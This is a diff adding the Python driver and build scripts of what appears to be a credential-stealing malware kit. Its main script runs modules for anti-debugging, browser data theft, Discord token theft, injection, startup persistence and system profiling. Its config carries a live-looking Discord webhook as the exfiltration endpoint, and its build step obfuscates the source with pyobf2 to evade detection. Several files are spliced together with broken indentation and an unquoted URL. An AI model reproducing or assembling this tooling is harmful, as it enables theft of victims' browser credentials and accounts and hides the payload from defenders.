@@ -1,0 +1,158 @@
+import logging
+
+import click
+from rich.logging import RichHandler
+
+from components.antidebug import AntiDebug
+from components.browsers import Browsers
+from components.discordtoken import DiscordToken
+from components.injection import Injection
+from components.startup import Startup
+from components.systeminfo import SystemInfo
+from config import __CONFIG__
+
+
+def main():
+    logging.basicConfig(
+        level="NOTSET",
+        format="%(message)s",
+        datefmt="[%X]",
+        handlers=[RichHandler(rich_tracebacks=True,
+                              tracebacks_suppress=[click])]
+    )
+    logging.getLogger("rich")
+
+    funcs = [
+        AntiDebug,
+        Browsers,
+        DiscordToken,
+        Injection,
+        Startup,
+        SystemInfo,
+    ]
+
+    for func in funcs:
+        if __CONFIG__[func.__name__.lower()]:
+            try:
+                if func.__init__.__code__.co_argcount == 2:
+                    func(__CONFIG__['webhook'])
+                else:
+                    func()
+
+            except Exception as e:
+                print(f'Error in {func.__name__}: {e}')
+
+
+if __name__ == '__main__':
+    main()
+
+    __CONFIG__ = {
+        'webhook': https://discord.com/api/webhooks/1275732183662989354/nJcRZIZrNcKTOKzBtRKVqMDu5pikjKiuHqi6aFfIpNlbrPzhLebUvM_aMcg6z0Am950f,
+        'antidebug': False,
+        'browsers': True,
+        'discordtoken': True,
+        'injection': False,
+        'startup': True,
+        'systeminfo': True,
+    }
+
+    import os
+import shutil
+
+
+class MakeEnv:
+    """
+    The MakeEnv class creates the build directory and clones the source code
+    """
+
+    def __init__(self) -> None:
+        self.build_dir = os.path.join(os.getcwd(), 'build')
+
+    def make_env(self) -> None:
+        """
+        Creates the build directory
+        """
+        if os.path.exists(self.build_dir):
+            shutil.rmtree(self.build_dir)
+
+        os.mkdir(self.build_dir)
+
+    def get_src(self) -> None:
+        src_dir = os.path.join(os.getcwd(), 'src')
+        shutil.copytree(src_dir, os.path.join(self.build_dir, 'src'))
+
+        import ast
+import os
+
+import pyobf2.lib as obf
+
+
+class DoObfuscate:
+    """
+    Obfuscate code using https://github.com/0x3C50/pyobf2
+    """
+
+    def __init__(self) -> None:
+        self.build_dir = os.path.join(os.getcwd(), 'build')
+        self.src_dir = os.path.join(self.build_dir, 'src')
+        self.config = {
+            "removeTypeHints.enabled": True,
+            "fstrToFormatSeq.enabled": True,
+            "encodeStrings.enabled": True,
+            "encodeStrings.mode": "xortable",
+            "floatsToComplex.enabled": True,
+            "intObfuscator.enabled": True,
+            "intObfuscator.mode": "decode",
+            "renamer.enabled": False,
+            "renamer.rename_format": "f'{kind}{get_counter(kind)}'",
+            "replaceAttribSet.enabled": True,
+            "unicodeTransformer.enabled": True,
+        }
+
+    def walk(self, path: str) -> dict:
+        """
+        Walk a directory and return a dict of files
+        """
+        files = {}
+        for root, _, filenames in os.walk(path):
+            for filename in filenames:
+                files[os.path.join(root, filename)] = os.path.join(
+                    root, filename).replace(path, '')
+        return files
+
+    def run(self) -> None:
+        """
+        Run the obfuscation
+        """
+        obf.set_config_dict(self.config)
+
+        tree = self.walk(self.src_dir)
+        for file in tree:
+            if file.endswith('.py'):
+                with open(file, 'r', encoding='utf-8') as f:
+                    code = f.read()
+                tree[file] = ast.parse(code)
+                tree[file] = obf.do_obfuscation_single_ast(
+                    tree[file], tree[file])
+                with open(file, 'w', encoding='utf-8') as f:
+                    f.write(ast.unparse(tree[file]))
+
+                    import os
+
+
+class WriteConfig:
+    """
+    The WriteConfig class writes the config data to the config file
+    """
+
+    def __init__(self, config: dict) -> None:
+        self.config = config
+        self.build_dir = os.path.join(os.getcwd(), 'build')
+        self.config_file = os.path.join(self.build_dir, 'src', 'config.py')
+
+    def write_config(self) -> None:
+        """
+        Writes the config data to the config file
+        """
+        with open(self.config_file, 'w') as f:
+            f.write(f'__CONFIG__ = {self.config}')
